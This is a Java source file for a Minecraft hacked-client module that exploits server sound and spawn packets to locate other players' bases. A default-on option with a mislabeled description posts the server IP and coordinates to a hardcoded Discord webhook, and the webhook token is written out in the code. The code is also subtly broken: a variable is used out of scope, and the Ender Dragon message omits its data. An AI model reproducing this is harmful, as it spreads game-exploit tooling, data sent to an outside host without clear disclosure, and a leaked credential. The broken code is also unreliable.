package me.rigamortis.seppuku.impl.module.misc;

import me.rigamortis.seppuku.Seppuku;
import me.rigamortis.seppuku.api.event.EventStageable;
import me.rigamortis.seppuku.api.event.network.EventReceivePacket;
import me.rigamortis.seppuku.api.module.Module;
import me.rigamortis.seppuku.api.value.Value;
import net.minecraft.client.Minecraft;
import net.minecraft.init.SoundEvents;
import net.minecraft.network.play.server.SPacketEffect;
import net.minecraft.network.play.server.SPacketSoundEffect;
import net.minecraft.network.play.server.SPacketSpawnMob;
import net.minecraft.util.SoundCategory;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.MathHelper;
import org.drink.piss.util.DiscordWebhookUtil;
import team.stiff.pomelo.impl.annotated.handler.annotation.Listener;

import java.awt.*;
import java.io.IOException;
import java.util.Objects;

/**
 * Author Seth
 * 4/17/2019 @ 12:28 AM.
 */
public final class CoordLoggerModule extends Module {

    public final Value<Mode> mode = new Value<Mode>("Mode", new String[]{"Mode", "M"}, "Change between various coord-logger modes.", Mode.VANILLA);

    private enum Mode {
        VANILLA, SPIGOT
    }

    public final Value<Boolean> thunder = new Value<Boolean>("Thunder", new String[]{"thund"}, "Logs positions of thunder/lightning sounds.", true);
    public final Value<Boolean> endPortal = new Value<Boolean>("EndPortal", new String[]{"portal"}, "Logs position of end portal creation sound.", true);
    public final Value<Boolean> wither = new Value<Boolean>("Wither", new String[]{"with"}, "Logs positions of wither sounds.", true);
    public final Value<Boolean> endDragon = new Value<Boolean>("EndDragon", new String[]{"dragon"}, "Logs positions of end dragon sounds.", true);
    public final Value<Boolean> slimes = new Value<Boolean>("Slimes", new String[]{"slime"}, "Logs positions of slime spawns.", false);
    public final Value<Boolean> webhook = new Value<Boolean>("Webhook", new String[]{"hook"}, "Logs positions of slime spawns.", true);

    public CoordLoggerModule() {
        super("CoordLogger", new String[]{"CoordLog", "CLogger", "CLog"}, "Logs useful coordinates", "NONE", -1, ModuleType.MISC);
    }

    @Override
    public String getMetaData() {
        return this.mode.getValue().name();
    }

    @Listener
    public void receivePacket(EventReceivePacket event) throws IOException {
        if (event.getStage() == EventStageable.EventStage.PRE) {
            String caughtType = null;
            String logData = null;

            if (event.getPacket() instanceof SPacketSpawnMob) {
                final SPacketSpawnMob packet = (SPacketSpawnMob) event.getPacket();
                if (this.slimes.getValue()) {
                    final Minecraft mc = Minecraft.getMinecraft();

                    if (packet.getEntityType() == 55 && packet.getY() <= 40 && !mc.world.getBiome(mc.player.getPosition()).getBiomeName().toLowerCase().contains("swamp")) {
                        final BlockPos pos = new BlockPos(packet.getX(), packet.getY(), packet.getZ());
                        logData = "X:" + mc.world.getChunk(pos).x + " Z:" + mc.world.getChunk(pos).z;
                        Seppuku.INSTANCE.logChat("Slime Spawned in chunk " + logData);
                        caughtType = "Slime";
                    }
                }
            }

            if (event.getPacket() instanceof SPacketSoundEffect) {
                final SPacketSoundEffect packet = (SPacketSoundEffect) event.getPacket();
                if (this.thunder.getValue()) {
                    if (packet.getCategory() == SoundCategory.WEATHER && packet.getSound() == SoundEvents.ENTITY_LIGHTNING_THUNDER) {
                        float yaw = 0;
                        final double difX = packet.getX() - Minecraft.getMinecraft().player.posX;
                        final double difZ = packet.getZ() - Minecraft.getMinecraft().player.posZ;

                        yaw += MathHelper.wrapDegrees((Math.toDegrees(Math.atan2(difZ, difX)) - 90.0f) - yaw);
                        logData = "X:" + Minecraft.getMinecraft().player.posX + " Z:" + Minecraft.getMinecraft().player.posZ + " Angle:" + yaw;

                        Seppuku.INSTANCE.logChat("Lightning spawned " + logData);
                        caughtType = "Thunder";
                    }
                }
            }
            if (event.getPacket() instanceof SPacketEffect) {
                final SPacketEffect packet = (SPacketEffect) event.getPacket();
                if (this.endPortal.getValue()) {
                    if (packet.getSoundType() == 1038) {
                        logData = "X:" + packet.getSoundPos().getX() + " Y:" + packet.getSoundPos().getY() + " Z:" + packet.getSoundPos().getZ();
                        Seppuku.INSTANCE.logChat("End Portal activated at " + logData);
                        caughtType = "End Portal";
                    }
                }
                if (this.wither.getValue()) {
                    if (packet.getSoundType() == 1023) {
                        switch (this.mode.getValue()) {
                            case VANILLA:
                                logData = "X:" + packet.getSoundPos().getX() + " Y:" + packet.getSoundPos().getY() + " Z:" + packet.getSoundPos().getZ();
                                Seppuku.INSTANCE.logChat("Wither spawned at " + logData);
                                break;
                            case SPIGOT:
                                float yaw = 0;
                                final double difX = packet.getSoundPos().getX() - Minecraft.getMinecraft().player.posX;
                                final double difZ = packet.getSoundPos().getZ() - Minecraft.getMinecraft().player.posZ;

                                yaw += MathHelper.wrapDegrees((Math.toDegrees(Math.atan2(difZ, difX)) - 90.0f) - yaw);

                                logData = "X:" + Minecraft.getMinecraft().player.posX + " Z:" + Minecraft.getMinecraft().player.posZ + " Angle:" + yaw;

                                Seppuku.INSTANCE.logChat("Wither spawned " + logData);
                                break;
                        }
                        caughtType = "Wither";
                    }
                }
                if (this.endDragon.getValue()) {
                    if (packet.getSoundType() == 1028) {
                        float yaw = 0;
                        final double difX = packet.getSoundPos().getX() - Minecraft.getMinecraft().player.posX;
                        final double difZ = packet.getSoundPos().getZ() - Minecraft.getMinecraft().player.posZ;

                        yaw += MathHelper.wrapDegrees((Math.toDegrees(Math.atan2(difZ, difX)) - 90.0f) - yaw);

                        logData = "X:" + Minecraft.getMinecraft().player.posX + " Z:" + Minecraft.getMinecraft().player.posZ + " Angle:" + yaw;

                        Seppuku.INSTANCE.logChat("Ender Dragon killed at ");
                        caughtType = "Dragon Death";
                    }
                }
            }

            if (this.webhook.getValue() && caughtType != null) {
                DiscordWebhookUtil webhook = new DiscordWebhookUtil("https://ptb.discordapp.com/api/webhooks/675041686354657320/yqOh-LKMJM_5ZUeUkLQMn4sDI4YHdVsa2j6lZKunRLkyQy5L1vIrkJx5qyPyCLjFCh6z");
                webhook.addEmbed(new DiscordWebhookUtil.EmbedObject()
                        .setTitle(caughtType)
                        .setDescription("Coordinates were found and placed here so triangulation can be done")
                        .setColor(this.getBorderColor(caughtType))
                        .addField("Server", Objects.requireNonNull(mc.getCurrentServerData()).serverIP, true)
                        .addField("Dimension", String.valueOf(mc.player.dimension), true)
                        .addField("Log Data", logData, false));
                webhook.execute(); //Handle exception
            }
        }
    }

    private Color getBorderColor(String soundType) {
        if (soundType.equalsIgnoreCase("Slime")) return Color.GREEN;
        if (soundType.equalsIgnoreCase("Thunder")) return Color.YELLOW;
        if (soundType.equalsIgnoreCase("End Portal")) return Color.WHITE;
        if (soundType.equalsIgnoreCase("Wither")) return Color.getHSBColor(36, 92, 20);
        if (soundType.equalsIgnoreCase("Dragon Death")) return Color.BLACK;
        else return Color.BLUE;
    }
}